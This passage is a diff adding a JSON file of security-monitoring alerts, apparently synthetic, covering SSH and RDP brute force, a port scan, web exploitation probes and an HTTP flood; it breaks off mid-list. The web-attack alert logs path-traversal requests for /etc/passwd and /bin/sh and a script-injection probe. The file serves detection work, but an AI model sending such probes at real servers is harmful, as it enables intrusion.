@@ -1,0 +1,4902 @@
+[
+  {
+    "rule_id": "DET-001",
+    "rule_name": "SSH brute force against Linux host",
+    "description": "Eight or more failed SSH authentications from one source IP against one host inside fifteen minutes indicates password guessing or spraying.",
+    "type": "threshold",
+    "base_severity": "High",
+    "confidence": 0.85,
+    "incident_type": "Brute Force",
+    "playbook": "PB-BRUTE-FORCE",
+    "mitre": [
+      {
+        "id": "T1110.001",
+        "tactic": "Credential Access",
+        "technique": "Brute Force: Password Guessing"
+      }
+    ],
+    "entity": {
+      "source.ip": "203.0.113.44",
+      "host.name": "web-srv-02.corp.local"
+    },
+    "group_key": "203.0.113.44|web-srv-02.corp.local",
+    "first_event_ts": "2026-10-22T03:00:00Z",
+    "last_event_ts": "2026-10-22T03:07:00Z",
+    "detected_at": "2026-10-22T03:07:00Z",
+    "event_count": 8,
+    "event_ids": [
+      "EVT-000710",
+      "EVT-000711",
+      "EVT-000712",
+      "EVT-000713",
+      "EVT-000714",
+      "EVT-000715",
+      "EVT-000716",
+      "EVT-000717"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000710",
+        "ts": "2026-10-22T03:00:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for root from 203.0.113.44 port 39197 ssh2"
+      },
+      {
+        "event_id": "EVT-000711",
+        "ts": "2026-10-22T03:01:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user admin from 203.0.113.44 port 59401 ssh2"
+      },
+      {
+        "event_id": "EVT-000712",
+        "ts": "2026-10-22T03:02:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user test from 203.0.113.44 port 48477 ssh2"
+      },
+      {
+        "event_id": "EVT-000713",
+        "ts": "2026-10-22T03:03:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user oracle from 203.0.113.44 port 46674 ssh2"
+      },
+      {
+        "event_id": "EVT-000714",
+        "ts": "2026-10-22T03:04:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for deploy from 203.0.113.44 port 40544 ssh2"
+      },
+      {
+        "event_id": "EVT-000715",
+        "ts": "2026-10-22T03:05:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for ubuntu from 203.0.113.44 port 42131 ssh2"
+      },
+      {
+        "event_id": "EVT-000716",
+        "ts": "2026-10-22T03:06:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for root from 203.0.113.44 port 48584 ssh2"
+      },
+      {
+        "event_id": "EVT-000717",
+        "ts": "2026-10-22T03:07:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user admin from 203.0.113.44 port 54647 ssh2"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "203.0.113.44",
+        "threat_type": "Brute Force",
+        "confidence": "high",
+        "source": "AbuseIPDB",
+        "first_seen": "2026-10-14",
+        "last_seen": "2026-10-25",
+        "tags": "ssh,credential-attack",
+        "description": "Host reported for repeated SSH password spraying against internet-facing servers"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "Administrator typos and misconfigured automation normally stay below the threshold; authorised scanners are allowlisted.",
+    "references": [
+      "https://attack.mitre.org/techniques/T1110/001/"
+    ],
+    "observables": {
+      "source_ips": [
+        "203.0.113.44"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "admin",
+        "deploy",
+        "oracle",
+        "root",
+        "test",
+        "ubuntu"
+      ],
+      "hosts": [
+        "web-srv-02.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "SSH brute force against Linux host: 8 matching event(s) for source.ip=203.0.113.44, host.name=web-srv-02.corp.local between 2026-10-22T03:00:00Z and 2026-10-22T03:07:00Z",
+    "alert_id": "ALT-2026-0007",
+    "risk_score": 88,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 6,
+      "asset": "web-srv-02.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "web-srv-02.corp.local",
+      "ip": "10.10.0.40",
+      "role": "Web / Reverse Proxy",
+      "criticality": "High",
+      "business_unit": "Engineering",
+      "environment": "production",
+      "data_classification": "Public"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-002",
+    "rule_name": "Successful SSH login following brute force",
+    "description": "A successful SSH session is established from an IP that produced at least five failures in the previous 30 minutes. Indicates probable account compromise.",
+    "type": "sequence",
+    "base_severity": "Critical",
+    "confidence": 0.9,
+    "incident_type": "Brute Force",
+    "playbook": "PB-BRUTE-FORCE",
+    "mitre": [
+      {
+        "id": "T1110.001",
+        "tactic": "Credential Access",
+        "technique": "Brute Force: Password Guessing"
+      },
+      {
+        "id": "T1078.003",
+        "tactic": "Defense Evasion",
+        "technique": "Valid Accounts: Local Accounts"
+      }
+    ],
+    "entity": {
+      "source.ip": "203.0.113.44"
+    },
+    "group_key": "203.0.113.44",
+    "first_event_ts": "2026-10-22T03:00:00Z",
+    "last_event_ts": "2026-10-22T03:14:00Z",
+    "detected_at": "2026-10-22T03:14:00Z",
+    "event_count": 6,
+    "event_ids": [
+      "EVT-000710",
+      "EVT-000711",
+      "EVT-000712",
+      "EVT-000713",
+      "EVT-000714",
+      "EVT-000722"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000710",
+        "ts": "2026-10-22T03:00:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for root from 203.0.113.44 port 39197 ssh2"
+      },
+      {
+        "event_id": "EVT-000711",
+        "ts": "2026-10-22T03:01:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user admin from 203.0.113.44 port 59401 ssh2"
+      },
+      {
+        "event_id": "EVT-000712",
+        "ts": "2026-10-22T03:02:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user test from 203.0.113.44 port 48477 ssh2"
+      },
+      {
+        "event_id": "EVT-000713",
+        "ts": "2026-10-22T03:03:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for invalid user oracle from 203.0.113.44 port 46674 ssh2"
+      },
+      {
+        "event_id": "EVT-000714",
+        "ts": "2026-10-22T03:04:00Z",
+        "action": "ssh_login_failed",
+        "message": "Failed password for deploy from 203.0.113.44 port 40544 ssh2"
+      },
+      {
+        "event_id": "EVT-000722",
+        "ts": "2026-10-22T03:14:00Z",
+        "action": "ssh_login_success",
+        "message": "Accepted password for deploy from 203.0.113.44 port 41990 ssh2"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "203.0.113.44",
+        "threat_type": "Brute Force",
+        "confidence": "high",
+        "source": "AbuseIPDB",
+        "first_seen": "2026-10-14",
+        "last_seen": "2026-10-25",
+        "tags": "ssh,credential-attack",
+        "description": "Host reported for repeated SSH password spraying against internet-facing servers"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "Users who fat-finger a password five or more times then succeed will match; correlate with source IP reputation and geo-velocity.",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "203.0.113.44"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "admin",
+        "deploy",
+        "oracle",
+        "root",
+        "test"
+      ],
+      "hosts": [
+        "web-srv-02.corp.local"
+      ],
+      "files": []
+    },
+    "chain": [
+      "Repeated SSH authentication failures",
+      "Successful SSH authentication"
+    ],
+    "summary": "Successful SSH login following brute force: 6 matching event(s) for source.ip=203.0.113.44 between 2026-10-22T03:00:00Z and 2026-10-22T03:14:00Z",
+    "alert_id": "ALT-2026-0009",
+    "risk_score": 100,
+    "severity": "Critical",
+    "score_breakdown": {
+      "base_rule_severity": 90,
+      "asset_criticality": 3,
+      "asset": "203.0.113.44",
+      "threat_intel": 12,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-003",
+    "rule_name": "Windows logon failure burst",
+    "description": "Ten or more Windows logon failures (4625) from one source IP against one host within ten minutes.",
+    "type": "threshold",
+    "base_severity": "High",
+    "confidence": 0.8,
+    "incident_type": "Brute Force",
+    "playbook": "PB-BRUTE-FORCE",
+    "mitre": [
+      {
+        "id": "T1110.003",
+        "tactic": "Credential Access",
+        "technique": "Brute Force: Password Spraying"
+      }
+    ],
+    "entity": {
+      "source.ip": "203.0.113.44",
+      "host.name": "jump-01.corp.local"
+    },
+    "group_key": "203.0.113.44|jump-01.corp.local",
+    "first_event_ts": "2026-10-25T04:00:00Z",
+    "last_event_ts": "2026-10-25T04:09:00Z",
+    "detected_at": "2026-10-25T04:09:00Z",
+    "event_count": 10,
+    "event_ids": [
+      "EVT-001076",
+      "EVT-001077",
+      "EVT-001078",
+      "EVT-001079",
+      "EVT-001080",
+      "EVT-001081",
+      "EVT-001082",
+      "EVT-001083",
+      "EVT-001084",
+      "EVT-001085"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-001076",
+        "ts": "2026-10-25T04:00:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001077",
+        "ts": "2026-10-25T04:01:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001078",
+        "ts": "2026-10-25T04:02:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001079",
+        "ts": "2026-10-25T04:03:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001080",
+        "ts": "2026-10-25T04:04:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001081",
+        "ts": "2026-10-25T04:05:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001082",
+        "ts": "2026-10-25T04:06:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001083",
+        "ts": "2026-10-25T04:07:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001084",
+        "ts": "2026-10-25T04:08:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      },
+      {
+        "event_id": "EVT-001085",
+        "ts": "2026-10-25T04:09:00Z",
+        "action": "windows_logon_failed",
+        "message": "An account failed to log on (RDP password spray)"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "203.0.113.44",
+        "threat_type": "Brute Force",
+        "confidence": "high",
+        "source": "AbuseIPDB",
+        "first_seen": "2026-10-14",
+        "last_seen": "2026-10-25",
+        "tags": "ssh,credential-attack",
+        "description": "Host reported for repeated SSH password spraying against internet-facing servers"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "203.0.113.44"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [
+        "administrator"
+      ],
+      "hosts": [
+        "jump-01.corp.local"
+      ],
+      "files": []
+    },
+    "summary": "Windows logon failure burst: 10 matching event(s) for source.ip=203.0.113.44, host.name=jump-01.corp.local between 2026-10-25T04:00:00Z and 2026-10-25T04:09:00Z",
+    "alert_id": "ALT-2026-0036",
+    "risk_score": 89,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 6,
+      "asset": "jump-01.corp.local",
+      "threat_intel": 12,
+      "volume_corroboration": 1,
+      "confidence_penalty": 0
+    },
+    "asset": {
+      "hostname": "jump-01.corp.local",
+      "ip": "10.10.0.50",
+      "role": "Jump Host",
+      "criticality": "High",
+      "business_unit": "IT",
+      "environment": "production",
+      "data_classification": "Restricted"
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-010",
+    "rule_name": "Network port scan",
+    "description": "Twenty or more firewall denials from a single source across at least ten distinct destination ports within five minutes indicates service discovery, whether the source is external or an unauthorised internal host.",
+    "type": "threshold",
+    "base_severity": "Medium",
+    "confidence": 0.8,
+    "incident_type": "Reconnaissance",
+    "playbook": "PB-RECON",
+    "mitre": [
+      {
+        "id": "T1046",
+        "tactic": "Discovery",
+        "technique": "Network Service Discovery"
+      }
+    ],
+    "entity": {
+      "source.ip": "198.51.100.23"
+    },
+    "group_key": "198.51.100.23",
+    "first_event_ts": "2026-10-21T01:40:00Z",
+    "last_event_ts": "2026-10-21T01:40:38Z",
+    "detected_at": "2026-10-21T01:40:38Z",
+    "event_count": 20,
+    "event_ids": [
+      "EVT-000530",
+      "EVT-000531",
+      "EVT-000532",
+      "EVT-000533",
+      "EVT-000534",
+      "EVT-000535",
+      "EVT-000536",
+      "EVT-000537",
+      "EVT-000538",
+      "EVT-000539",
+      "EVT-000540",
+      "EVT-000541",
+      "EVT-000542",
+      "EVT-000543",
+      "EVT-000544",
+      "EVT-000545",
+      "EVT-000546",
+      "EVT-000547",
+      "EVT-000548",
+      "EVT-000549"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000530",
+        "ts": "2026-10-21T01:40:00Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:21 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000531",
+        "ts": "2026-10-21T01:40:02Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:22 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000532",
+        "ts": "2026-10-21T01:40:04Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:23 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000533",
+        "ts": "2026-10-21T01:40:06Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:25 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000534",
+        "ts": "2026-10-21T01:40:08Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:80 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000535",
+        "ts": "2026-10-21T01:40:10Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:443 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000536",
+        "ts": "2026-10-21T01:40:12Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:445 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000537",
+        "ts": "2026-10-21T01:40:14Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:3306 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000538",
+        "ts": "2026-10-21T01:40:16Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:3389 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000539",
+        "ts": "2026-10-21T01:40:18Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:5432 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000540",
+        "ts": "2026-10-21T01:40:20Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:6379 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000541",
+        "ts": "2026-10-21T01:40:22Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:8080 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000542",
+        "ts": "2026-10-21T01:40:24Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:8443 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000543",
+        "ts": "2026-10-21T01:40:26Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:9200 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000544",
+        "ts": "2026-10-21T01:40:28Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.40:11211 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000545",
+        "ts": "2026-10-21T01:40:30Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.30:21 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000546",
+        "ts": "2026-10-21T01:40:32Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.30:22 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000547",
+        "ts": "2026-10-21T01:40:34Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.30:23 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000548",
+        "ts": "2026-10-21T01:40:36Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.30:25 rule=default-deny"
+      },
+      {
+        "event_id": "EVT-000549",
+        "ts": "2026-10-21T01:40:38Z",
+        "action": "firewall_deny",
+        "message": "deny tcp 198.51.100.23->10.10.0.30:80 rule=default-deny"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "198.51.100.23",
+        "threat_type": "Reconnaissance",
+        "confidence": "high",
+        "source": "OTX AlienVault",
+        "first_seen": "2026-10-10",
+        "last_seen": "2026-10-26",
+        "tags": "scanner,exploit,log4shell",
+        "description": "Automated mass scanner probing web and SSH services"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "Authorised vulnerability scanners are suppressed through detections/allowlists.json.",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "198.51.100.23"
+      ],
+      "destination_ips": [
+        "10.10.0.30",
+        "10.10.0.40"
+      ],
+      "domains": [],
+      "users": [],
+      "hosts": [
+        "db01.corp.local",
+        "web-srv-02.corp.local"
+      ],
+      "files": []
+    },
+    "distinct_count": 15,
+    "distinct_values": [
+      "11211",
+      "21",
+      "22",
+      "23",
+      "25",
+      "3306",
+      "3389",
+      "443",
+      "445",
+      "5432",
+      "6379",
+      "80",
+      "8080",
+      "8443",
+      "9200"
+    ],
+    "summary": "Network port scan: 20 matching event(s) for source.ip=198.51.100.23 between 2026-10-21T01:40:00Z and 2026-10-21T01:40:38Z",
+    "alert_id": "ALT-2026-0004",
+    "risk_score": 62,
+    "severity": "Medium",
+    "score_breakdown": {
+      "base_rule_severity": 45,
+      "asset_criticality": 3,
+      "asset": "198.51.100.23",
+      "threat_intel": 12,
+      "volume_corroboration": 2,
+      "confidence_penalty": 0
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-011",
+    "rule_name": "Web exploitation attempt",
+    "description": "Request path or query string contains signatures for path traversal, SQL injection, command injection or known vulnerable application probes.",
+    "type": "match",
+    "base_severity": "High",
+    "confidence": 0.75,
+    "incident_type": "Web Attack",
+    "playbook": "PB-WEB-ATTACK",
+    "mitre": [
+      {
+        "id": "T1190",
+        "tactic": "Initial Access",
+        "technique": "Exploit Public-Facing Application"
+      }
+    ],
+    "entity": {
+      "source.ip": "198.51.100.23"
+    },
+    "group_key": "198.51.100.23",
+    "first_event_ts": "2026-10-21T02:05:11Z",
+    "last_event_ts": "2026-10-21T02:06:17Z",
+    "detected_at": "2026-10-21T02:06:17Z",
+    "event_count": 6,
+    "event_ids": [
+      "EVT-000594",
+      "EVT-000595",
+      "EVT-000596",
+      "EVT-000597",
+      "EVT-000598",
+      "EVT-000600"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000594",
+        "ts": "2026-10-21T02:05:11Z",
+        "action": "http_request",
+        "message": "GET /../../../../etc/passwd -> 403"
+      },
+      {
+        "event_id": "EVT-000595",
+        "ts": "2026-10-21T02:05:22Z",
+        "action": "http_request",
+        "message": "GET /..%2f..%2f..%2fetc%2fpasswd -> 400"
+      },
+      {
+        "event_id": "EVT-000596",
+        "ts": "2026-10-21T02:05:33Z",
+        "action": "http_request",
+        "message": "GET /wp-admin/admin-ajax.php -> 403"
+      },
+      {
+        "event_id": "EVT-000597",
+        "ts": "2026-10-21T02:05:44Z",
+        "action": "http_request",
+        "message": "GET /cgi-bin/.%2e/%2e%2e/bin/sh -> 400"
+      },
+      {
+        "event_id": "EVT-000598",
+        "ts": "2026-10-21T02:05:55Z",
+        "action": "http_request",
+        "message": "GET /actuator/env -> 403"
+      },
+      {
+        "event_id": "EVT-000600",
+        "ts": "2026-10-21T02:06:17Z",
+        "action": "http_request",
+        "message": "GET /login?next=<script>alert(1)</script> -> 403"
+      }
+    ],
+    "intel": [
+      {
+        "type": "ip",
+        "value": "198.51.100.23",
+        "threat_type": "Reconnaissance",
+        "confidence": "high",
+        "source": "OTX AlienVault",
+        "first_seen": "2026-10-10",
+        "last_seen": "2026-10-26",
+        "tags": "scanner,exploit,log4shell",
+        "description": "Automated mass scanner probing web and SSH services"
+      }
+    ],
+    "suppressed": false,
+    "suppression": null,
+    "false_positive_notes": "Web application firewalls and QA penetration tests generate identical signatures; allowlist the testing window.",
+    "references": [],
+    "observables": {
+      "source_ips": [
+        "198.51.100.23"
+      ],
+      "destination_ips": [],
+      "domains": [],
+      "users": [],
+      "hosts": [
+        "web-srv-02"
+      ],
+      "files": []
+    },
+    "summary": "Web exploitation attempt: 6 matching event(s) for source.ip=198.51.100.23 between 2026-10-21T02:05:11Z and 2026-10-21T02:06:17Z",
+    "alert_id": "ALT-2026-0005",
+    "risk_score": 85,
+    "severity": "High",
+    "score_breakdown": {
+      "base_rule_severity": 70,
+      "asset_criticality": 3,
+      "asset": "198.51.100.23",
+      "threat_intel": 12,
+      "volume_corroboration": 0,
+      "confidence_penalty": 0
+    },
+    "intel_high_confidence": true
+  },
+  {
+    "rule_id": "DET-012",
+    "rule_name": "HTTP flood / denial of service",
+    "description": "Three hundred or more HTTP requests from one external source inside five minutes against the public web tier.",
+    "type": "threshold",
+    "base_severity": "High",
+    "confidence": 0.8,
+    "incident_type": "DDoS",
+    "playbook": "PB-DDOS",
+    "mitre": [
+      {
+        "id": "T1498.001",
+        "tactic": "Impact",
+        "technique": "Network Denial of Service: Direct Network Flood"
+      }
+    ],
+    "entity": {
+      "source.ip": "203.0.113.199"
+    },
+    "group_key": "203.0.113.199",
+    "first_event_ts": "2026-10-20T14:00:00Z",
+    "last_event_ts": "2026-10-20T14:04:29Z",
+    "detected_at": "2026-10-20T14:04:29Z",
+    "event_count": 300,
+    "event_ids": [
+      "EVT-000115",
+      "EVT-000116",
+      "EVT-000117",
+      "EVT-000118",
+      "EVT-000119",
+      "EVT-000120",
+      "EVT-000121",
+      "EVT-000122",
+      "EVT-000123",
+      "EVT-000124",
+      "EVT-000125",
+      "EVT-000126",
+      "EVT-000127",
+      "EVT-000128",
+      "EVT-000129",
+      "EVT-000130",
+      "EVT-000131",
+      "EVT-000132",
+      "EVT-000133",
+      "EVT-000134",
+      "EVT-000135",
+      "EVT-000136",
+      "EVT-000137",
+      "EVT-000138",
+      "EVT-000139",
+      "EVT-000140",
+      "EVT-000141",
+      "EVT-000142",
+      "EVT-000143",
+      "EVT-000144",
+      "EVT-000145",
+      "EVT-000146",
+      "EVT-000147",
+      "EVT-000148",
+      "EVT-000149",
+      "EVT-000150",
+      "EVT-000151",
+      "EVT-000152",
+      "EVT-000153",
+      "EVT-000154",
+      "EVT-000155",
+      "EVT-000156",
+      "EVT-000157",
+      "EVT-000158",
+      "EVT-000159",
+      "EVT-000160",
+      "EVT-000161",
+      "EVT-000162",
+      "EVT-000163",
+      "EVT-000164"
+    ],
+    "events": [
+      {
+        "event_id": "EVT-000115",
+        "ts": "2026-10-20T14:00:00Z",
+        "action": "http_request",
+        "message": "GET /?s=0 -> 200"
+      },
+      {
+        "event_id": "EVT-000116",
+        "ts": "2026-10-20T14:00:00Z",
+        "action": "http_request",
+        "message": "GET /?s=1 -> 503"
+      },
+      {
+        "event_id": "EVT-000117",
+        "ts": "2026-10-20T14:00:01Z",
+        "action": "http_request",
+        "message": "GET /?s=2 -> 503"
+      },
+      {
+        "event_id": "EVT-000118",
+        "ts": "2026-10-20T14:00:02Z",
+        "action": "http_request",
+        "message": "GET /?s=3 -> 200"
+      },
+      {
+        "event_id": "EVT-000119",
+        "ts": "2026-10-20T14:00:03Z",
+        "action": "http_request",
+        "message": "GET /?s=4 -> 503"
+      },
+      {
+        "event_id": "EVT-000120",
+        "ts": "2026-10-20T14:00:04Z",
+        "action": "http_request",
+        "message": "GET /?s=5 -> 503"
+      },
+      {
+        "event_id": "EVT-000121",
+        "ts": "2026-10-20T14:00:05Z",
+        "action": "http_request",
+        "message": "GET /?s=6 -> 200"
+      },
+      {
+        "event_id": "EVT-000122",
+        "ts": "2026-10-20T14:00:06Z",
+        "action": "http_request",
+        "message": "GET /?s=7 -> 503"
+      },
+      {
+        "event_id": "EVT-000123",
+        "ts": "2026-10-20T14:00:07Z",
+        "action": "http_request",
+        "message": "GET /?s=8 -> 503"
+      },
+      {
+        "event_id": "EVT-000124",
+        "ts": "2026-10-20T14:00:08Z",
+        "action": "http_request",
+        "message": "GET /?s=9 -> 200"
+      },
+      {
+        "event_id": "EVT-000125",
+        "ts": "2026-10-20T14:00:09Z",
+        "action": "http_request",
+        "message": "GET /?s=10 -> 503"
+      },
+      {
+        "event_id": "EVT-000126",
+        "ts": "2026-10-20T14:00:09Z",
+        "action": "http_request",
+        "message": "GET /?s=11 -> 503"
+      },
+      {
+        "event_id": "EVT-000127",
+        "ts": "2026-10-20T14:00:10Z",
+        "action": "http_request",
+        "message": "GET /?s=12 -> 200"
+      },
+      {
+        "event_id": "EVT-000128",
+        "ts": "2026-10-20T14:00:11Z",
+        "action": "http_request",
+        "message": "GET /?s=13 -> 503"
+      },
+      {
+        "event_id": "EVT-000129",
+        "ts": "2026-10-20T14:00:12Z",
+        "action": "http_request",
+        "message": "GET /?s=14 -> 503"
+      },
+      {
+        "event_id": "EVT-000130",
+        "ts": "2026-10-20T14:00:13Z",
+        "action": "http_request",
+        "message": "GET /?s=15 -> 200"
+      },
+      {
+        "event_id": "EVT-000131",
+        "ts": "2026-10-20T14:00:14Z",
+        "action": "http_request",
+        "message": "GET /?s=16 -> 503"
+      },
+      {
+        "event_id": "EVT-000132",
+        "ts": "2026-10-20T14:00:15Z",
+        "action": "http_request",
+        "message": "GET /?s=17 -> 503"
+      },
+      {
+        "event_id": "EVT-000133",
+        "ts": "2026-10-20T14:00:16Z",
+        "action": "http_request",
+        "message": "GET /?s=18 -> 200"
+      },
+      {
+        "event_id": "EVT-000134",
+        "ts": "2026-10-20T14:00:17Z",
+        "action": "http_request",
+        "message": "GET /?s=19 -> 503"
+      },
+      {
+        "event_id": "EVT-000135",
+        "ts": "2026-10-20T14:00:18Z",
+        "action": "http_request",
+        "message": "GET /?s=20 -> 503"
+      },
+      {
+        "event_id": "EVT-000136",
+        "ts": "2026-10-20T14:00:18Z",
+        "action": "http_request",
+        "message": "GET /?s=21 -> 200"
+      },
+      {
+        "event_id": "EVT-000137",
+        "ts": "2026-10-20T14:00:19Z",
+        "action": "http_request",
+        "message": "GET /?s=22 -> 503"
+      },
+      {
+        "event_id": "EVT-000138",
+        "ts": "2026-10-20T14:00:20Z",
+        "action": "http_request",
+        "message": "GET /?s=23 -> 503"
+      },
+      {
+        "event_id": "EVT-000139",
+        "ts": "2026-10-20T14:00:21Z",
+        "action": "http_request",
+        "message": "GET /?s=24 -> 200"
+      },
+      {
+        "event_id": "EVT-000140",
+        "ts": "2026-10-20T14:00:22Z",
+        "action": "http_request",
+        "message": "GET /?s=25 -> 503"
+      },
+      {
+        "event_id": "EVT-000141",
+        "ts": "2026-10-20T14:00:23Z",
+        "action": "http_request",
+        "message": "GET /?s=26 -> 503"
+      },
+      {
+        "event_id": "EVT-000142",
+        "ts": "2026-10-20T14:00:24Z",
+        "action": "http_request",
+        "message": "GET /?s=27 -> 200"
+      },
+      {
+        "event_id": "EVT-000143",
+        "ts": "2026-10-20T14:00:25Z",
+        "action": "http_request",
+        "message": "GET /?s=28 -> 503"
+      },
+      {
+        "event_id": "EVT-000144",
+        "ts": "2026-10-20T14:00:26Z",
+        "action": "http_request",
+        "message": "GET /?s=29 -> 503"
+      },
+      {
+        "event_id": "EVT-000145",
+        "ts": "2026-10-20T14:00:27Z",
+        "action": "http_request",
+        "message": "GET /?s=30 -> 200"
+      },
+      {
+        "event_id": "EVT-000146",
+        "ts": "2026-10-20T14:00:27Z",
+        "action": "http_request",
+        "message": "GET /?s=31 -> 503"
+      },
+      {
+        "event_id": "EVT-000147",
+        "ts": "2026-10-20T14:00:28Z",
+        "action": "http_request",
+        "message": "GET /?s=32 -> 503"
+      },
+      {
+        "event_id": "EVT-000148",
+        "ts": "2026-10-20T14:00:29Z",
+        "action": "http_request",
+        "message": "GET /?s=33 -> 200"
+      },
+      {
+        "event_id": "EVT-000149",
+        "ts": "2026-10-20T14:00:30Z",
+        "action": "http_request",
+        "message": "GET /?s=34 -> 503"
+      },
+      {
+        "event_id": "EVT-000150",
+        "ts": "2026-10-20T14:00:31Z",
+        "action": "http_request",
+        "message": "GET /?s=35 -> 503"
+      },
+      {
+        "event_id": "EVT-000151",
+        "ts": "2026-10-20T14:00:32Z",
+        "action": "http_request",
+        "message": "GET /?s=36 -> 200"
+      },
+      {
+        "event_id": "EVT-000152",
+        "ts": "2026-10-20T14:00:33Z",
+        "action": "http_request",
+        "message": "GET /?s=37 -> 503"
+      },
+      {
+        "event_id": "EVT-000153",
+        "ts": "2026-10-20T14:00:34Z",
+        "action": "http_request",
+        "message": "GET /?s=38 -> 503"
+      },
+      {
+        "event_id": "EVT-000154",
+        "ts": "2026-10-20T14:00:35Z",
+        "action": "http_request",
